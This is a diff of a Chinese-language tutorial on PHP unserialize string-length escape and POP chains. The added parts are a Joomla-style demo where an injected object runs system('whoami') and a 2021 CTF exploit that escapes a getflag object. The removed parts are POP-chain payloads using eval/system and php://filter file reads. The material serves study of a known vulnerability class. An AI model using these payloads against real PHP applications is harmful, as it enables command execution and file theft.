@@ -31,6 +31,8 @@ object(Demo)#1 (1) {
 
 反序列化的过程是`{`最近的`;}`完成匹配并停止解析,在序列化结果的结尾加上无意义字符串仍然能够进行反序列化
 
+### 字符串变长
+
 ```php
 <?php
 error_reporting(E_ALL);
@@ -52,6 +54,7 @@ a:2:{i:0;s:4:"ayyyyyy";i:1;s:6:"123456";}
 
 Notice: unserialize(): Error at offset 18 of 41 bytes in /var/www/html/test.php on line 11
 ```
+
 要做到在`str_replace`后仍然能够正常进行反序列化,并修改密码
 
 `";i:1;s:6:"123456";}`的长度为20,`20+len=2*len`,`len=20`,因此`x`共有20个
@@ -77,7 +80,7 @@ a:2:{i:0;s:41:"ayyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy";i:1;s:6:"654321";}";i:
 array(2) { [0]=> string(41) "ayyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy" [1]=> string(6) "654321" } 
 ```
 
-### 反序列化对象逃逸
+### 字符串变短
 
 ```php
 <?php
@@ -106,263 +109,147 @@ array(3) { ["name"]=> string(20) "";s:4:"info";s:60:"a" ["info"]=> string(10) "g
 
 后面的`s:4:"info";s:10:"gululingbo";s:6:"secret";s:7:"7654321";`正常进行反序列化,然后遇到`}`且对象数量已经满足,因此反序列化正常结束
 
-例题[https://misaka.gq/2021/03/06/CTF-Web/#easy-serialize-php](https://misaka.gq/2021/03/06/CTF-Web/#easy-serialize-php)
+### 例题
 
-### POP链
+#### Joomla反序列化逃逸
 
-#### 样例1
+[简易版的Joomla处理反序列化的机制](https://xz.aliyun.com/t/6718/#toc-1)
+
+```php
+<?php
+
+class evil
+{
+    public $cmd;
+
+    public function __construct($cmd)
+    {
+        $this->cmd = $cmd;
+    }
+
+    public function __destruct()
+    {
+        system($this->cmd);
+    }
+}
+
+class User
+{
+    public $username;
+    public $password;
+
+    public function __construct($username, $password)
+    {
+        $this->username = $username;
+        $this->password = $password;
+    }
+
+}
+
+function write($data)
+{
+    $data = str_replace(chr(0) . '*' . chr(0), '\0\0\0', $data);
+    file_put_contents("/tmp/dbs.txt", $data);
+}
+
+function read()
+{
+    $data = file_get_contents("/tmp/dbs.txt");
+    $data = str_replace('\0\0\0', chr(0) . '*' . chr(0), $data);
+    return $data;
+}
+
+if (file_exists("/tmp/dbs.txt")) {
+    unlink("/tmp/dbs.txt");
+}
+
+$username = '\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0';
+$password = 'a";s:8:"password";O:4:"evil":1:{s:3:"cmd";s:6:"whoami";}';
+
+write(serialize(new User($username, $password)));
+var_dump(unserialize(read()));
+```
+
+```
+www-data
+boolean false
+```
+
+注意`'\0\0\0'`与`"\0\0\0"`的区别,在`read`函数中将`\0\0\0`(六个字符)替换为`chr(0).'*'.chr(0)`(三个字符),由于字符串发生变短,此处产生了字符串逃逸,利用逃逸的字符串对`evil`进行反序列化并进行命令执行
+
+#### 2021年新生赛easy-unserialize
+
+[xp0int-2021-ctf-web/easy-unserialize](https://github.com/mi3aka/xp0int-2021-ctf-web/tree/master/easy-unserialize)
 
 ```php
 <?php
 highlight_file(__FILE__);
-class DemoA{
-    public $a;
-    function __construct(){
-        $this->a=new DemoB();
-    }
-    function __destruct(){
-        $this->a->func();
-    }
-}
-class DemoB{
-    function func(){
-        echo "hacker"."<br>";
+
+class getflag
+{
+    public $file;
+
+    public function __destruct()
+    {
+        if ($this->file === "flag.php") {
+            echo file_get_contents($this->file);
+        }
     }
 }
-class DemoC{
-    private $a;
-    function func(){
-        eval($this->a);
+
+class tmp
+{
+    public $str1;
+    public $str2;
+
+    public function __construct($str1, $str2)
+    {
+        $this->str1 = $str1;
+        $this->str2 = $str2;
     }
 }
-unserialize($_GET['a']);
-?>
+
+$str1 = $_POST['str1'];
+$str2 = $_POST['str2'];
+$data = serialize(new tmp($str1, $str2));
+$data = str_replace("easy", "ez", $data);
+unserialize($data);
 ```
-
-payload`a=O:5:"DemoA":1:{s:1:"a";O:5:"DemoC":1:{s:8:"%00DemoC%00a";s:13:"system("ls");";}}`
-
-注意DemoC中的$a为private变量要表示为`%00DemoC%00a`
-
-#### 样例2
 
 ```php
 <?php
 highlight_file(__FILE__);
-class DemoA{
-    public $a;
-    public function __destruct(){
-        $this->a->func();
-    }
-}
-class DemoB{
-    public $a;
-    public function func(){
-        $this->a->func();
-    }
-}
-class DemoC{
-    public $a;
-    public function __call($tmp1,$tmp2){
-        $b=$this->a;
-        $b();
-    }
-}
-class DemoD{
-    public $a;
-    public $b;
-    public function __invoke(){
-        $this->a="Come on,".$this->b;
-        echo $this->a;
-    }
-}
-class DemoE{
-    public $a;
-    public function __toString(){
-        $this->a->flag();
-        return "very close!!!";
-    }
-}
-class getflag{
-    public function flag(){
-        echo "flag{xxx}";
-    }
-}
-unserialize($_GET['a']);
-?>
-```
 
-```php
-<?php
-class DemoA{
-    public $a;
-}
-class DemoB{
-    public $a;
-}
-class DemoC{
-    public $a;
-}
-class DemoD{
-    public $b;
-}
-class DemoE{
-    public $a;
-}
-class getflag{
-}
-$a=new DemoA();
-$b=new DemoB();
-$c=new DemoC();
-$d=new DemoD();
-$e=new DemoE();
-$flag=new getflag();
-$a->a=$b;
-$b->a=$c;
-$c->a=$d;
-$d->b=$e;
-$e->a=$flag;
-echo serialize($a);
-?>
-```
+class getflag
+{
+    public $file;
 
-payload`O:5:"DemoA":1:{s:1:"a";O:5:"DemoB":1:{s:1:"a";O:5:"DemoC":1:{s:1:"a";O:5:"DemoD":1:{s:1:"b";O:5:"DemoE":1:{s:1:"a";O:7:"getflag":0:{}}}}}}`
-
-#### 样例3
-
-MRCTF2020 easypop
-
-```php
-<?php
-//flag is in flag.php
-//WTF IS THIS?
-//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
-//And Crack It!
-class Modifier {
-    protected  $var;//php://filter/read=convert.base64-encode/resource=flag.php
-    public function append($value){
-        include($value);
-    }
-    public function __invoke(){
-        $this->append($this->var);
-    }
-}
-
-class Show{
-    public $source;//Show()
-    public $str;//Test()
-    public function __construct($file='index.php'){
-        $this->source = $file;
-        echo 'Welcome to '.$this->source."<br>";
-    }
-    public function __toString(){
-        return $this->str->source;//Test::__get()
-    }
-
-    public function __wakeup(){
-        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {//$this->source=Show(),在preg_match时调用__toString
-            echo "hacker";
-            $this->source = "index.php";
+    public function __destruct()
+    {
+        if ($this->file === "flag.php") {
+            echo file_get_contents($this->file);
         }
     }
 }
 
-class Test{
-    public $p;//Modifier()
-    public function __construct(){
-        $this->p = array();
+class tmp
+{
+    public $str1;
+    public $str2;
+
+    public function __construct($str1, $str2)
+    {
+        $this->str1 = $str1;
+        $this->str2 = $str2;
     }
 
-    public function __get($key){
-        $function = $this->p;//Modifier::__invoke()
-        return $function();
-    }
 }
 
-if(isset($_GET['pop'])){
-    @unserialize($_GET['pop']);
-}
-else{
-    $a=new Show;
-    highlight_file(__FILE__);
-}
+$str1 = 'easyeasyeasyeasyeasyeasyeasyeasyeasy';
+$str2 = ';s:4:"str2";O:7:"getflag":1:{s:4:"file";s:8:"flag.php";}';
+$data = serialize(new tmp($str1, $str2));
+$data = str_replace("easy", "ez", $data);
+unserialize($data);
 ```
 
-```php
-<?php
-class Modifier {
-    protected $var='php://filter/read=convert.base64-encode/resource=flag.php';
-}
-class Show{
-    public $source;
-    public $str;
-}
-class Test{
-    public $p;
-}
-$show1=new Show();
-$show2=new Show();
-$test=new Test();
-$modifier=new Modifier();
-$show1->str=$test;
-$test->p=$modifier;
-$show2->source=$show1;
-var_dump(serialize($show2));
-?>
-```
-
-payload`?pop=O:4:"Show":2:{s:6:"source";O:4:"Show":2:{s:6:"source";N;s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:6:"%00*%00var";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}}}s:3:"str";N;}`
-
-注意Modifier中的$var为protected变量要表示为`%00*%00var`
-
-#### 样例4
-
-```php
-<?php
-class MyFile {
-    public $name;
-    public $user;
-    public function __construct($name, $user) {
-        $this->name = $name;
-        $this->user = $user; 
-    }
-    public function __toString(){
-        return file_get_contents($this->name);
-    }
-    public function __wakeup(){
-        if(stristr($this->name, "flag")!==False) 
-            $this->name = "/etc/hostname";
-        else
-            $this->name = "/etc/passwd"; 
-        if(isset($_GET['user'])) {
-            $this->user = $_GET['user']; //user可控,但name不可控,通过浅复制使name取user的值,进而达到控制name的目的
-        }
-    }
-    public function __destruct() {
-        echo $this; //__toString
-    }
-}
-if(isset($_GET['input'])){
-    $input = $_GET['input']; 
-    if(stristr($input, 'user')!==False){//$input中不能出现user,在反序列化时用大写的S替换小写的s即可用16进制表示user,进而绕过限制
-        die('Hacker'); 
-    } else {
-        unserialize($input);
-    }
-}else { 
-    highlight_file(__FILE__);
-}
-```
-
-```php
-<?php
-class MyFile {
-    public $name='flag';
-    public $user='';
-}
-$a=new MyFile();
-$a->name=&$a->user;//浅复制
-var_dump(serialize($a));
-?>
-```
-
-payload`?input=O:6:"MyFile":2:{s:4:"name";s:0:"";S:4:"\75ser";R:2;}&user=php://filter/read=convert.base64-encode/resource=flag.php`
+利用`easy`缩短成`ez`产生的长度差,将`getflag`的反序列化逃逸出去
